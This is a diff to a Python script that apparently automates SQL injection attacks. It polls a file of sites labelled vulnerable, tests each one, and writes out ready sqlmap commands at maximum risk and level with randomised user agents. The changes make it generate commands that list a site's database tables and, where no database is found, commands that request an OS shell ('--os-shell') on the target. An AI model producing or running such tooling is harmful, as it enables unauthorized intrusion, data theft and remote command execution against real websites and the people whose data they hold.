@@ -282,16 +282,18 @@ def test_sites():
 
 	sites_num = get_number(SITES_FILE)
 
-	while sites_num == 0:
-		print(YELLOW_FONT + "Waiting for vulnerable sites to come\n" + END_FONT)
-		time.sleep(60)
-		sites_num = get_number(SITES_FILE)
 
 	while True:
 		#while sites_num == 0:
 		#	print(YELLOW_FONT +"Waiting for vulnerable sites to come\n" +END_FONT)
 		#	time.sleep(60)
 		#	sites_num = get_number(SITES_FILE)
+
+		while sites_num == 0:
+			print(YELLOW_FONT + "Waiting for vulnerable sites to come\n" + END_FONT)
+			time.sleep(60)
+			sites_num = get_number(SITES_FILE)
+	
 		try:
 			site = get_site(SITES_FILE)
 			if site[len(site) - 1] == '/':
@@ -320,7 +322,9 @@ def test_sites():
 		#	print(YELLOW_FONT +"Waiting for vulnerable sites to come\n" +END_FONT)
 		#	time.sleep(60)
 		#	sites_num = get_number(SITES_FILE)
-
+	with open("debug.txt","w+") as debug:
+		debug.write("stopped")
+		debug.close();
 	return (l_sql, l_error)
 
 
@@ -434,16 +438,20 @@ def filter():
 							result.write(
 								"python " +
 								SQLMAP_PATH +
-								"/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch --random-agent -D " %
+								"/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent -D " %
 								(site,
 								 ) +
 								db +
-								"\n")
+								" --tables\n")
 						result.close()
 					os.remove("finished/" + file)
 				else:
 					print(" Found but not db\n")
-					os.rename("finished/" + file, "maybe/" + file)
+					with open("maybe/" + file, "w+") as result:
+						result.write(site + "\n")
+						result.write( "python " + SQLMAP_PATH + "/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent --os-shell " % (site,  ) + "\n")
+						result.close()
+					os.remove("finished/" + file)
 
 			f.close()
 
